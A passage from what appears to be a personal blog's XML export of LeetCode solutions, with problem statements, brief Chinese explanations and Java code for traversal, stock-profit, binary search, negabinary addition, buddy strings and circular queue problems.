(big &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      cur.next = <span class="keyword">new</span> ListNode(big);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.next;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/add-two-numbers/discuss/?currentPage=1&amp;orderBy=recent_activity&amp;query=" target="_blank" rel="noopener">add-two-numbers</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>144. Binary Tree Preorder Traversal</title>
    <url>/2019/05/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Binary%20Tree%20Preorder%20Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the preorder traversal of its nodes’ values.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br></pre></td></tr></table></figure>
<p>Output: [1,2,3]</p>
<blockquote>
<p>Follow up: Recursive solution is trivial, could you do it iteratively?</p>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>二叉树的前序遍历</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>递归解决</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; pre = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    pre.add(root.val);</span><br><span class="line">    pre.addAll(preorderTraversal(root.left));</span><br><span class="line">    pre.addAll(preorderTraversal(root.right));</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>迭代</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">   List&lt;Integer&gt; list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">   Stack&lt;TreeNode&gt; rights = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">   <span class="keyword">while</span>(node != <span class="keyword">null</span>) &#123;</span><br><span class="line">     list.add(node.val);</span><br><span class="line">     <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">       rights.push(node.right);</span><br><span class="line">     &#125;</span><br><span class="line">     node = node.left;</span><br><span class="line">     <span class="keyword">if</span> (node == <span class="keyword">null</span> &amp;&amp; !rights.isEmpty()) &#123;</span><br><span class="line">       node = rights.pop();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> list;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/binary-tree-preorder-traversal/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">binary-tree-preorder-traversal</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>binary tree</tag>
      </tags>
  </entry>
  <entry>
    <title>121. Best Time to Buy and Sell Stock</title>
    <url>/2019/07/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Best%20Time%20to%20Buy%20and%20Sell%20Stock/</url>
    <content><![CDATA[<p>Say you have an array for which the ith element is the price of a given stock on day i.</p>
<p>If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p>Note that you cannot sell a stock before you buy one.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [7,1,5,3,6,4]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5.</span><br><span class="line">             Not 7-1 = 6, as selling price needs to be larger than buying price.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [7,6,4,3,1]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: In this case, no transaction is done, i.e. max profit = 0.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一个股票价格的数组,索引表示买入股票的天数.求出某一天卖出股票使得股票收益最大,求出这个最大收益值.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>暴力枚举求解,时间复杂度为 O(n^2)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = prices.length;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">int</span> a = prices[i];</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">        <span class="keyword">int</span> b = prices[j];</span><br><span class="line">        <span class="keyword">if</span>(b &gt; a &amp;&amp; ( b - a ) &gt; result) &#123;</span><br><span class="line">          result = b - a;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>动态规划</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">maxProfitDp</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxCur = <span class="number">0</span>, maxSoFar = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">      maxCur = Math.max(<span class="number">0</span>, maxCur += prices[i] - prices[i - <span class="number">1</span>]);</span><br><span class="line">      maxSoFar = Math.max(maxCur, maxSoFar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSoFar;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>动态规划</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> min = Integer.MAX_VALUE, max = -<span class="number">1</span>, n = prices.length;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(min&gt;prices[i])&#123;</span><br><span class="line">               min = prices[i];</span><br><span class="line">           &#125;</span><br><span class="line">           max = Math.max(max,prices[i]-min);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">best-time-to-buy-and-sell-stock</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>704. Binary Search</title>
    <url>/2019/05/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Binary%20Search/</url>
    <content><![CDATA[<p>Given a sorted (in ascending order) integer array nums of n elements and a target value, write a function to search target in nums. If target exists, then return its index, otherwise return -1.</p>
<blockquote>
<ul>
<li><p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums = [-1,0,3,5,9,12], target = 9</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: 9 exists in nums and its index is 4</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums = [-1,0,3,5,9,12], target = 2</span><br><span class="line">Output: -1</span><br><span class="line">Explanation: 2 does not exist in nums so return -1</span><br></pre></td></tr></table></figure>
</li>
<li><p>Note:</p>
</li>
</ul>
<ol>
<li>You may assume that all elements in nums are unique.</li>
<li>n will be in the range [1, 10000].</li>
<li>The value of each element in nums will be in the range [-9999, 9999].<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1>在一个升序数组中查找是否存在目标元素target,返回其索引。不存在返回-1.<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1></li>
</ol>
<ul>
<li><p>java<br>双指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>,right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = left; i&lt;= right;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (nums[right] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (left &lt; target)&#123;</span><br><span class="line">        left ++;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (right &gt; target)&#123;</span><br><span class="line">        right --;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>java</p>
</li>
</ul>
</blockquote>
<p>二分查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pivot, left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">      pivot = (left + right) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[pivot] == target) <span class="keyword">return</span> pivot;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[pivot]) right = pivot - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> left = pivot + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/binary-search/solution/" target="_blank" rel="noopener">Binary Search</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1073. Adding Two Negabinary Numbers</title>
    <url>/2019/06/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Adding%20Two%20Negabinary%20Numbers/</url>
    <content><![CDATA[<p>Given two numbers arr1 and arr2 in base -2, return the result of adding them together.</p>
<p>Each number is given in array format: as an array of 0s and 1s, from most significant bit to least significant bit. For example, arr = [1,1,0,1] represents the number (-2)^3 + (-2)^2 + (-2)^0 = -3. A number arr in array format is also guaranteed to have no leading zeros: either arr == [0] or arr[0] == 1.</p>
<p>Return the result of adding arr1 and arr2 in the same format: as an array of 0s and 1s with no leading zeros.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: arr1 = [1,1,1,1,1], arr2 = [1,0,1]</span><br><span class="line">Output: [1,0,0,0,0]</span><br><span class="line">Explanation: arr1 represents 11, arr2 represents 5, the output represents 16.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Note:</li>
</ul>
<p>1 &lt;= arr1.length &lt;= 1000</p>
<p>1 &lt;= arr2.length &lt;= 1000</p>
<p>arr1 and arr2 have no leading zeros</p>
<p>arr1[i] is 0 or 1</p>
<p>arr2[i] is 0 or 1</p>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>将两个数组,转化为-2 进制数后求和。将和也对应转化为-2 进制返回.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] addNegabinary(<span class="keyword">int</span>[] arr1, <span class="keyword">int</span>[] arr2) &#123;</span><br><span class="line">         <span class="keyword">int</span> i = arr1.length - <span class="number">1</span>, j = arr2.length - <span class="number">1</span>, carry = <span class="number">0</span>;</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> v1 = i &gt;= <span class="number">0</span> ? arr1[i--] : <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> v2 = j &gt;= <span class="number">0</span> ? arr2[j--] : <span class="number">0</span>;</span><br><span class="line">      carry = v1 + v2 + carry;</span><br><span class="line">      stack.push(carry &amp; <span class="number">1</span>);</span><br><span class="line">      carry = -(carry &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; stack.peek() == <span class="number">0</span>) &#123;</span><br><span class="line">      stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[stack.size()];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">      res[index++] = stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.length == <span class="number">0</span> ? <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1</span>] : res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://en.wikipedia.org/wiki/Negative_base" target="_blank" rel="noopener">Negative_base</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/adding-two-negabinary-numbers/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">adding-two-negabinary-numbers</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>859. Buddy Strings</title>
    <url>/2019/05/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Buddy%20Strings/</url>
    <content><![CDATA[<p>Given two strings A and B of lowercase letters, return true if and only if we can swap two letters in A so that the result equals B.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A = &quot;ab&quot;, B = &quot;ba&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A = &quot;ab&quot;, B = &quot;ab&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A = &quot;aa&quot;, B = &quot;aa&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 4:</p>
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A = &quot;aaaaaaabc&quot;, B = &quot;aaaaaaacb&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 5:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: A = &quot;&quot;, B = &quot;aa&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>0 &lt;= A.length &lt;= 20000</li>
<li>0 &lt;= B.length &lt;= 20000</li>
<li>A and B consist only of lowercase letters.</li>
</ol>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>交换A字符串的两个字符，使得 A = B.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">buddyStrings</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (A.length() != B.length() ) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (A.length() &lt; <span class="number">2</span> || B.length() &lt; <span class="number">2</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> len = A.length();</span><br><span class="line">    <span class="keyword">char</span>[] chA = A.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] chB = B.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> modCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>[] ele = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">    Set&lt;Character&gt; keySet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">char</span> a = chA[i];</span><br><span class="line">      <span class="keyword">char</span> b = chB[i];</span><br><span class="line">      keySet.add(a);</span><br><span class="line">      <span class="keyword">if</span> (modCount &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">        modCount += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (ele[<span class="number">0</span>] == <span class="string">'\u0000'</span>)&#123;</span><br><span class="line">          ele[<span class="number">0</span>] = a;</span><br><span class="line">          ele[<span class="number">1</span>] = b;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ele[<span class="number">2</span>] = a;</span><br><span class="line">          ele[<span class="number">3</span>] = b;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (modCount == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> keySet.size() &lt; chA.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ele[<span class="number">0</span>] == ele[<span class="number">3</span>] &amp;&amp; ele[<span class="number">1</span>] == ele[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">buddyStrings</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (A.length() != B.length())&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> (A.equals(B)) &#123;</span><br><span class="line">           Set&lt;Character&gt; s = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">char</span> c : A.toCharArray()) &#123;</span><br><span class="line">               s.add(c);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> s.size() &lt; A.length();</span><br><span class="line">       &#125;</span><br><span class="line">       List&lt;Integer&gt; dif = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length(); ++i) <span class="keyword">if</span> (A.charAt(i) != B.charAt(i)) dif.add(i);</span><br><span class="line">       <span class="keyword">return</span> dif.size() == <span class="number">2</span> &amp;&amp; A.charAt(dif.get(<span class="number">0</span>)) == B.charAt(dif.get(<span class="number">1</span>)) &amp;&amp; A.charAt(dif.get(<span class="number">1</span>)) == B.charAt(dif.get(<span class="number">0</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/buddy-strings/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">buddy-strings</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>622. Design Circular Queue</title>
    <url>/2019/05/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Design%20Circular%20Queue/</url>
    <content><![CDATA[<p>Design your implementation of the circular queue. The circular queue is a linear data structure in which the operations are performed based on FIFO (First In First Out) principle and the last position is connected back to the first position to make a circle. It is also called “Ring Buffer”.</p>
<p>One of the benefits of the circular queue is that we can make use of the spaces in front of the queue. In a normal queue, once the queue becomes full, we cannot insert the next element even if there is a space in front of the queue. But using the circular queue, we can use the space to store new values.</p>
<p>Your implementation should support following operations:</p>
<p>MyCircularQueue(k): Constructor, set the size of the queue to be k.<br>Front: Get the front item from the queue. If the queue is empty, return -1.<br>Rear: Get the last item from the queue. If the queue is empty, return -1.<br>enQueue(value): Insert an element into the circular queue. Return true if the operation is successful.<br>deQueue(): Delete an element from the circular queue. Return true if the operation is successful.<br>isEmpty(): Checks whether the circular queue is empty or not.<br>isFull(): Checks whether the circular queue is full or not.</p>
<p>Example:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyCircularQueue circularQueue = new MyCircularQueue(3); // set the size to be 3</span><br><span class="line">circularQueue.enQueue(1);  // return true</span><br><span class="line">circularQueue.enQueue(2);  // return true</span><br><span class="line">circularQueue.enQueue(3);  // return true</span><br><span class="line">circularQueue.enQueue(4);  // return false, the queue is full</span><br><span class="line">circularQueue.Rear();  // return 3</span><br><span class="line">circularQueue.isFull();  // return true</span><br><span class="line">circularQueue.deQueue();  // return true</span><br><span class="line">circularQueue.enQueue(4);  // return true</span><br><span class="line">circularQueue.Rear();  // return 4</span><br></pre></td></tr></table></figure></p>
<p>Note:</p>
<blockquote>
<ul>
<li>All values will be in the range of [0, 1000].</li>
<li>The number of operations will be in the range of [1, 1000].</li>
<li>Please do not use the built-in Queue library.<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1></li>
</ul>
</blockquote>
<p>题意比较简单，设计一个队列.用数组实现,用头尾两个指针来访问元素。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>不使用内置队列库实现一个队列.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCircularQueue</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. Set the size of the queue to be k. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyCircularQueue</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[k];</span><br><span class="line">        head = -<span class="number">1</span>;</span><br><span class="line">        tail = -<span class="number">1</span>;</span><br><span class="line">        size = k;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Insert an element into the circular queue. Return true if the operation is successful. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enQueue</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isFull() == <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty() == <span class="keyword">true</span>) &#123;</span><br><span class="line">            head = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tail = (tail + <span class="number">1</span>) % size;</span><br><span class="line">        data[tail] = value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Delete an element from the circular queue. Return true if the operation is successful. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">deQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty() == <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (head == tail) &#123;</span><br><span class="line">            head = -<span class="number">1</span>;</span><br><span class="line">            tail = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        head = (head + <span class="number">1</span>) % size;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front item from the queue. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty() == <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data[head];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the last item from the queue. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Rear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty() == <span class="keyword">true</span>) &#123;</span><br><span class="line">            <span 